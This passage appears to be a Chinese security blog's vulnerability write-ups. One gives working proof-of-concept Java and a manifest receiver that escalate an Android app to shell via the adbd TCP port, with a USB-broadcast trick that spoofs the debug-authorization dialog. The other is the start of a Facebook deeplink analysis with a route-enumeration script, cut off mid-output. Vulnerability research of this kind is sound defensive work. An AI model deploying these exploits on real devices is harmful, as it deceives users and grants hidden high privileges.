android.os.SystemProperties;</span><br><span class="line"> <span class="keyword">import</span> android.util.Log;</span><br><span class="line"> <span class="keyword">import</span> android.view.LayoutInflater;</span><br><span class="line">+<span class="keyword">import</span> android.view.MotionEvent;</span><br><span class="line"> <span class="keyword">import</span> android.view.View;</span><br><span class="line">+<span class="keyword">import</span> android.view.Window;</span><br><span class="line">+<span class="keyword">import</span> android.view.WindowManager;</span><br><span class="line"> <span class="keyword">import</span> android.widget.CheckBox;</span><br><span class="line">+<span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">import</span> com.android.internal.app.AlertActivity;</span><br><span class="line"> <span class="keyword">import</span> com.android.internal.app.AlertController;</span><br><span class="line">@@ <span class="number">-48</span>,<span class="number">6</span> +<span class="number">52</span>,<span class="number">10</span> @@</span><br><span class="line"> </span><br><span class="line">     @Override</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle icicle)</span> </span>&#123;</span><br><span class="line">+        Window window = getWindow();</span><br><span class="line">+        window.addPrivateFlags(WindowManager.LayoutParams.PRIVATE_FLAG_HIDE_NON_SYSTEM_OVERLAY_WINDOWS);</span><br><span class="line">+        window.setType(WindowManager.LayoutParams.TYPE_SYSTEM_DIALOG);</span><br><span class="line">+</span><br><span class="line">         super.onCreate(icicle);</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span> (SystemProperties.getInt(<span class="string">&quot;service.adb.tcp.port&quot;</span>, <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">@@ <span class="number">-79</span>,<span class="number">6</span> +<span class="number">87</span>,<span class="number">23</span> @@</span><br><span class="line">         ap.mView = checkbox;</span><br><span class="line"> </span><br><span class="line">         setupAlert();</span><br><span class="line">+</span><br><span class="line">+        <span class="comment">// adding touch listener on affirmative button - checks if window is obscured</span></span><br><span class="line">+        <span class="comment">// if obscured, do not let user give permissions (could be tapjacking involved)</span></span><br><span class="line">+        <span class="comment">//增加了对伪造窗口的认证判定，防止用户被误导授权</span></span><br><span class="line">+        <span class="keyword">final</span> View.OnTouchListener filterTouchListener = (View v, MotionEvent event) -&gt; &#123;</span><br><span class="line">+            <span class="comment">// Filter obscured touches by consuming them.</span></span><br><span class="line">+            <span class="keyword">if</span> (((event.getFlags() &amp; MotionEvent.FLAG_WINDOW_IS_OBSCURED) != <span class="number">0</span>)</span><br><span class="line">+                    || ((event.getFlags() &amp; MotionEvent.FLAG_WINDOW_IS_PARTIALLY_OBSCURED) != <span class="number">0</span>)) &#123;</span><br><span class="line">+                <span class="keyword">if</span> (event.getAction() == MotionEvent.ACTION_UP) &#123;</span><br><span class="line">+                    Toast.makeText(v.getContext(),</span><br><span class="line">+                            R.<span class="built_in">string</span>.touch_filtered_warning,</span><br><span class="line">+                            Toast.LENGTH_SHORT).show();</span><br><span class="line">+                &#125;</span><br><span class="line">+                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">+            &#125;</span><br><span class="line">+            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">+        &#125;;</span><br><span class="line">+        mAlert.getButton(BUTTON_POSITIVE).setOnTouchListener(filterTouchListener);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h4 id="问题"><a href="#问题" class="headerlink" title="问题:"></a><strong>问题</strong>:</h4><ol><li><p>貌似只是对伪造窗口进行了防御，可漏洞难道不是因为TCP端口监听而造成提权吗？</p></li><li><p>那也就是用户授权后，依旧可以在移动端获取shell权限？</p><p> 结论:<br> <code>确实可以在移动端获取到shell权限</code></p></li></ol><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a><strong>思考</strong></h4><p>那如果假设能监听用户是否连接USB，在用户进行正常的USB连接PC操作时，劫持授权窗口,即弹出我们的授权，也可以造成用户误导授权。</p><p>  结论:<br>  <code>确实可以构造接收广播，当USB连接到PC时，会优先弹出我们的授权窗口，从而误导用户获得授权</code></p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路:"></a><strong>攻击思路</strong>:</h4><ul><li><p>静态注册监听USB连接状态的广播，优先级设置为最高</p></li><li><p>一旦监听到连接，启动后台service，执行连接命令</p></li><li><p>此时会优先弹出我们的授权窗口，<strong>由于授权窗口并没有说明来自哪里的弹窗</strong>，见下图对比，仅仅是RSA指纹不同，即使是技术人员，也很难识别是来自哪里的授权窗口。</p></li></ul><p><strong>PC端授权窗口</strong><br><img src="/Users/tasfa/Downloads/Screenshots/pc.png"></p><p><strong>apk恶意授权窗口</strong><br><img src="/Users/tasfa/Downloads/Screenshots/apk.png"></p><h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>试验环境: Android 4.4.4 Nexus 5</p><p>PC端执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb tcpip 5555</span><br></pre></td></tr></table></figure><p>作者攻击思路验证Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">escalatePrivilege</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        如果大于android 6.0</span></span><br><span class="line"><span class="comment">        需要使用预编译的adb可执行二进制文件</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] connectCmd = &#123;<span class="string">&quot;adb&quot;</span>,<span class="string">&quot;connect&quot;</span>,<span class="string">&quot;127.0.0.1:5555&quot;</span>&#125;;</span><br><span class="line">            String[] idCmd = &#123;<span class="string">&quot;adb&quot;</span>,<span class="string">&quot;shell&quot;</span>,<span class="string">&quot;id&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">            execCommand(connectCmd);</span><br><span class="line">            execCommand(idCmd);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;escalatePrivilege: &quot;</span> + e.toString() );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readData</span><span class="params">(InputStream inputStream)</span></span>&#123;</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inputStream));</span><br><span class="line">        String data ;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                data = reader.readLine();</span><br><span class="line">                <span class="keyword">if</span>(data == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;output: &quot;</span> + data);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Process <span class="title">execCommand</span><span class="params">(String[] cmds)</span></span>&#123;</span><br><span class="line">        ProcessBuilder builder = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">        Process execCommandProcess = <span class="keyword">null</span>;</span><br><span class="line">        builder.command(cmds);</span><br><span class="line">        builder.directory(<span class="keyword">this</span>.getFilesDir());</span><br><span class="line">        builder.redirectErrorStream(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, String&gt; env = builder.environment();</span><br><span class="line">        env.put(<span class="string">&quot;HOME&quot;</span>, <span class="keyword">this</span>.getFilesDir().toString());</span><br><span class="line">        env.put(<span class="string">&quot;TMPDIR&quot;</span>, <span class="keyword">this</span>.getFilesDir().toString());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            execCommandProcess = builder.start();</span><br><span class="line">            execCommandProcess.waitFor();</span><br><span class="line">            readData(execCommandProcess.getInputStream());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> execCommandProcess;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>会弹出USB调试授权窗口，google已经修复此覆盖hijack漏洞。</p><p>Logcat输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">output: connected to 127.0.0.1:5555</span><br><span class="line">output: uid&#x3D;2000(shell) gid&#x3D;2000(shell) groups&#x3D;1003(graphics),1004(input),1007(log),1009(mount),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context&#x3D;u:r:shell:s0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>备注:</p><p>可能在实验的时候，会没有弹出授权窗口，此时删除apk，撤销USB授权后，重启机器可还原环境。</p><h3 id="0x04-思考部分攻击思路Exp"><a href="#0x04-思考部分攻击思路Exp" class="headerlink" title="0x04 思考部分攻击思路Exp"></a>0x04 思考部分攻击思路Exp</h3><p>AndroidManifest.xml 增加USB广播:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;receiver</span><br><span class="line">    android:name=&quot;.UsbBroadcastReceiver&quot;</span><br><span class="line">    android:enabled=&quot;true&quot;</span><br><span class="line">    android:exported=&quot;true&quot;&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.usb.action.USB_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在接收广播后，启动service,在onStartCommand中进行连接:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;onStartCommand: adb vul&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String[] connectCmd = &#123;<span class="string">&quot;adb&quot;</span>,<span class="string">&quot;connect&quot;</span>,<span class="string">&quot;127.0.0.1:5555&quot;</span>&#125;;</span><br><span class="line">        execCommand(connectCmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此时只要用户打开过该恶意应用，然后连接USB至电脑，则会弹出恶意的授权窗口:<br><img src="/Users/tasfa/Downloads/Screenshots/fakeapk.png"><br>只有用户点击一律允许后，再次连接usb才会弹出pc端的授权，也因此造成了用户的诱导.</p><h3 id="0x05-防御与总结"><a href="#0x05-防御与总结" class="headerlink" title="0x05 防御与总结"></a>0x05 防御与总结</h3><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ul><li><p>在进行试验的时候，漏洞利用阶段相对不稳定，有时候在连接的时候，并没有正常的弹窗，具体原因暂不明，后续有时间再研究。只要能正常弹出授权窗口，那么以上的攻击思路也即生效。</p></li><li><p>尽量在正规应用商店下载应用，不要授权来历不明的PC，注意授权的指纹信息</p></li><li><p>漏洞由于需要用户授权，也因此严重程度较低</p></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>业务思考: 在用户进行正常授权后，可获得shell权限，也即可以实现静默安装、卸载等功能。</li><li>通过授权劫持攻击，恶意应用可以在用户不知情的情况下获取高权限，从而对系统造成破坏</li></ul><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-android-adbd-privilege-escalation-advisory-2018-01-17.pdf">Privilege Escalation via adbd Misconfiguration</a></p><p><a href="http://www.freebuf.com/vuls/161150.html">经验分享 | 通过adbd配置漏洞在安卓设备上提升权限 </a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h3&gt;&lt;p&gt;adb由于拥有shell权限，因此仅在授权PC端后才可使用shell权限，而通过该漏洞，可以实现在移动端获取shell权限，以致于可随意删除应用、屏幕截图等等高权限操作。不过移动端恶意应用程序必须能够连接到adbd正在监听的TCP端口，这就需要应用程序在它的AndroidMainifest.xml中定义INTERNET权限。&lt;/p&gt;
&lt;p&gt;而漏洞作者所用的攻击方法是构造一个覆盖窗口，劫持用户点击，也就是经典的hijack攻击。Google也据此修复了此种攻击方式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但是，我经过尝试后发现，除了以上构造hijack攻击窗口外，还可以劫持USB广播，然后在用户进行正常的连接电脑操作时，劫持授权界面，使用户误导从而进行授权。也即造成新的劫持授权漏洞方案。&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android漏洞" scheme="http://example.com/tags/Android%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Facebook任意JS代码执行漏洞原理与利用分析</title>
    <link href="http://example.com/2018/10/06/Facebook%E4%BB%BB%E6%84%8FJS%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2018/10/06/Facebook%E4%BB%BB%E6%84%8FJS%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</id>
    <published>2018-10-06T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.205Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h3><p>最近FB Android应用爆出了一个任意JS代码执行的漏洞,着手分析了一下，也挺有趣，分享学习一下,有不当之处还请包涵，欢迎讨论学习。</p><p>测试环境:Android </p><p>测试版本:Facebook </p><p>测试版本下载: <a href="https://facebook.en.9apps.com/">9Apps</a></p><p>ps：FreeBuf Style Title: 看我如何挖到价值$8500的Facebook漏洞 ：）</p><h3 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h3><p>根据漏洞的简单描述,得知漏洞起因依旧是deeplink的问题,如果对这方面知识不熟悉，可以参考我的其他文章。</p><span id="more"></span><p>既然是deeplink,切入的思路从AndroidManifest.xml也是比较正常的思路。<br>通过搜索”&lt;data”、”android:scheme”等关键词,可以定位到关键的activity</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity</span><br><span class="line">android:theme=&quot;@7F1D0588&quot;</span><br><span class="line">android:name=&quot;com.facebook.katana.IntentUriHandler&quot;</span><br><span class="line">android:taskAffinity=&quot;com.facebook.task.IntentUriHandler&quot;</span><br><span class="line">android:excludeFromRecents=&quot;true&quot;</span><br><span class="line">android:launchMode=&quot;3&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;intent-filter</span><br><span class="line">&gt;</span><br><span class="line">&lt;action</span><br><span class="line">android:name=&quot;android.intent.action.VIEW&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">&lt;category</span><br><span class="line">android:name=&quot;android.intent.category.DEFAULT&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">&lt;data</span><br><span class="line">android:scheme=&quot;facebook&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">&lt;intent-filter</span><br><span class="line">&gt;</span><br><span class="line">&lt;action</span><br><span class="line">android:name=&quot;android.intent.action.VIEW&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">&lt;category</span><br><span class="line">android:name=&quot;android.intent.category.DEFAULT&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">&lt;category</span><br><span class="line">android:name=&quot;android.intent.category.BROWSABLE&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">&lt;data</span><br><span class="line">android:scheme=&quot;fb&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">...省略android:scheme=http/https</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;intent-filter</span><br><span class="line">&gt;</span><br><span class="line">&lt;action</span><br><span class="line">android:name=&quot;android.intent.action.VIEW&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">&lt;category</span><br><span class="line">android:name=&quot;android.intent.category.DEFAULT&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">&lt;category</span><br><span class="line">android:name=&quot;android.intent.category.BROWSABLE&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">&lt;data</span><br><span class="line">android:scheme=&quot;dialtone&quot;</span><br><span class="line">&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析可知:</p><p>该Apk有三个scheme,但只有两个有属性<strong>android:name=”android.intent.category.BROWSABLE</strong>,因此可以通过浏览器打开的只有”fb”、”dialtone”</p><p>自然,切入<strong>com.facebook.katana.IntentUriHandler</strong>查看究竟。</p><p>这里有个小问题,直接打开jeb是无法找到这个类的，直接找台root手机在内存中把dex抠出来，或者在app的data/dex目录下都可以拿到dex文件</p><p>拿到了总共12个dex文件</p><p><img src="/Users/tasfa/Downloads/dex.png"></p><p>全部加载进jeb，搜索关键字即可。</p><p>但是存在问题就是分散的dex，jeb无法进行关联，因此大部分会反编译失败，只能阅读smali代码，或者另一种思路，即是将其合并成一个完整的dex</p><p>这里我们进行另一个思路，我们可以全局搜索**fb://**关键字，看看有什么关键的信息。</p><p>搜索后我们发现<strong>assets/Bundle-fb4.js.hbc</strong>，通过分析该文件，找到了大量的fb协议deeplink。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fb:&#x2F;&#x2F;embedded_native_browser?url&#x3D;https%3A%2F%2Fwww.buzzfeed.com%2FsigninePatchImaget</span><br><span class="line"></span><br><span class="line">fb:&#x2F;&#x2F;marketplace_product_details_from_for_sale_item_id?forSaleItemID&#x3D;blink_informatStringetMonthNamesTrying</span><br><span class="line"></span><br><span class="line">fb:&#x2F;&#x2F;adsmanager&#x2F;image&#x2F;select&#x2F;&#123;page&#125;&#x2F;test_portal_pickergb(251, 114, 75) </span><br><span class="line"></span><br><span class="line">fb:&#x2F;&#x2F;ama?entryPoint&#x3D;BOOKMARK&amp;targetURI&#x3D;%2FywV1681912765254542690646773064807605154172325604775729VXkLTLove</span><br></pre></td></tr></table></figure><p>我们再继续搜索关键词<strong>embedded_native_browser</strong>、<strong>ama</strong>等等</p><p>发现另一个文件<strong>react_native_routes.json</strong>存在大量可利用的特征</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;AMAShellRoute&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;navigationOptions&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;fb_hidesTabBar_POST_IN_IOS_NAVIGATION_BEFORE_USING&quot;</span>: <span class="string">&quot;&lt;fb_hidesTabBar&gt;&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;fb_showNavBarSearchField&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;presentationMethod&quot;</span>: <span class="string">&quot;&lt;presentationMethod&gt;&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;path&quot;</span>: <span class="string">&quot;/ama&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;paramDefinitions&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;entryPoint&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;String&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;fb_hidesTabBar&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;String&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;presentationMethod&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;String&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;targetURI&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;String&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;required&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;access&quot;</span>: <span class="string">&quot;exported&quot;</span></span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>从名字也可知道这是关键的路由url,由于文件比较长，我们可以自动化脚本处理一下，自动化生成deeplink。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.json&#x27;</span>,<span class="string">&quot;rw&quot;</span>) <span class="keyword">as</span> load_f:</span><br><span class="line">load_dict = json.load(load_f)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(load_dict)):</span><br><span class="line">param = <span class="string">&#x27;&#x27;</span></span><br><span class="line">keys = load_dict[<span class="number">0</span>][<span class="string">&#x27;paramDefinitions&#x27;</span>].keys()</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(keys)):</span><br><span class="line">param = param + keys[y] + <span class="string">&#x27;=&#x27;</span> + load_dict[<span class="number">0</span>][<span class="string">&#x27;paramDefinitions&#x27;</span>][keys[y]][<span class="string">&#x27;type&#x27;</span>] + <span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;fb:/&#x27;</span> + load_dict[x][<span class="string">&#x27;path&#x27;</span>] + <span class="string">&#x27;/?&#x27;</span> + param</span><br><span class="line"><span class="built_in">print</span> url[:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>结果节选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 